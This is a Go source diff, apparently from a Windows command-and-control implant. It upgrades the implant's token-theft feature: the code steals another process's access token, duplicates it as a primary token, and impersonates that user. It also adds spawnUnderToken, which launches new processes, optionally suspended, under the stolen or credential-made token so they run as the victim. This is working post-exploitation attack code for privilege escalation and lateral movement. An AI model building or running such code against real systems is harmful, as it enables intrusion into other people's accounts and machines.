@@ -186,6 +186,13 @@ func tokenListProcesses() ([]tokenInfoResult, error) {
 	return results, nil
 }
 
+// activeTokenHandle holds the duplicated primary token for the currently
+// stolen/made logon. The agent's own thread impersonates it (so file/network
+// access runs as the target user) and newly spawned processes are created under
+// the same token via CreateProcessAsUserW, so the token propagates to child
+// processes instead of only affecting the agent thread.
+var activeTokenHandle uintptr
+
 func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 	hProc, _, _ := procOpenProcess.Call(
 		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
@@ -209,13 +216,16 @@ func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 
 	integrity = getTokenIntegrity(hToken)
 
+	// Duplicate a PRIMARY token: ImpersonateLoggedOnUser accepts a primary token
+	// (so the agent thread is impersonated) and CreateProcessAsUserW requires one
+	// (so the token propagates to child processes).
 	var hDup uintptr
 	ret, _, le = procDuplicateTokenEx.Call(
 		hToken,
 		uintptr(TOKEN_ALL_ACCESS_TOKEN),
 		0,
 		uintptr(SecurityImpersonation),
-		uintptr(TokenImpersonation),
+		uintptr(TokenPrimary),
 		uintptr(unsafe.Pointer(&hDup)),
 	)
 	if ret == 0 {
@@ -232,10 +242,13 @@ func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
 	}
 
 	ret, _, le = procImpersonateLoggedOnUser.Call(hDup)
-	procCloseHandle.Call(hDup)
 	if ret == 0 {
+		procCloseHandle.Call(hDup)
 		return domain, username, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
 	}
+
+	// Keep the primary token alive so spawned processes inherit it.
+	activeTokenHandle = hDup
 
 	debugLog(fmt.Sprintf("Token stolen from pid %d: %s\\%s (%s)", pid, domain, username, integrity))
 	return domain, username, integrity, nil
@@ -284,19 +297,56 @@ func tokenMake(domainUser, password, logonTypeStr string) (domain, username, int
 	integrity = getTokenIntegrity(hToken)
 
 	ret, _, le = procImpersonateLoggedOnUser.Call(hToken)
-	procCloseHandle.Call(hToken)
 	if ret == 0 {
+		procCloseHandle.Call(hToken)
 		return dom, user, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
 	}
 
+	// Keep the primary token alive so spawned processes inherit it.
+	activeTokenHandle = hToken
+
 	debugLog(fmt.Sprintf("Token made for %s\\%s (%s)", dom, user, integrity))
 	return dom, user, integrity, nil
+}
+
+// spawnUnderToken creates a new process under the active (stolen/made) primary
+// token so the child runs as the impersonated user. Falls back to a plain
+// CreateProcess when no token is active.
+func spawnUnderToken(exePath, cmdLine string, suspended bool) (hProc, hThread uintptr, pid uint32, err error) {
+	if activeTokenHandle == 0 {
+		return 0, 0, 0, fmt.Errorf("no active token")
+	}
+	exePtr, _ := syscall.UTF16PtrFromString(exePath)
+	cmdPtr, _ := syscall.UTF16PtrFromString(cmdLine)
+	si := &startupInfoExW{cb: uint32(unsafe.Sizeof(startupInfoExW{})), dwFlags: 0x00000001, wShowWindow: 0}
+	var pi processInformation
+	flags := uint32(0)
+	if suspended {
+		flags = 0x4
+	}
+	ret, _, le := procCreateProcessAsUserW.Call(
+		activeTokenHandle,
+		uintptr(unsafe.Pointer(exePtr)),
+		uintptr(unsafe.Pointer(cmdPtr)),
+		0, 0, 0,
+		uintptr(flags), 0, 0,
+		uintptr(unsafe.Pointer(si)),
+		uintptr(unsafe.Pointer(&pi)),
+	)
+	if ret == 0 {
+		return 0, 0, 0, fmt.Errorf("CreateProcessAsUserW failed: %v", le)
+	}
+	return pi.hProcess, pi.hThread, pi.dwProcessID, nil
 }
 
 func tokenRevert() error {
 	ret, _, le := procRevertToSelf.Call()
 	if ret == 0 {
 		return fmt.Errorf("RevertToSelf failed: %v", le)
+	}
+	if activeTokenHandle != 0 {
+		procCloseHandle.Call(activeTokenHandle)
+		activeTokenHandle = 0
 	}
 	debugLog("RevertToSelf: back to process token")
 	return nil
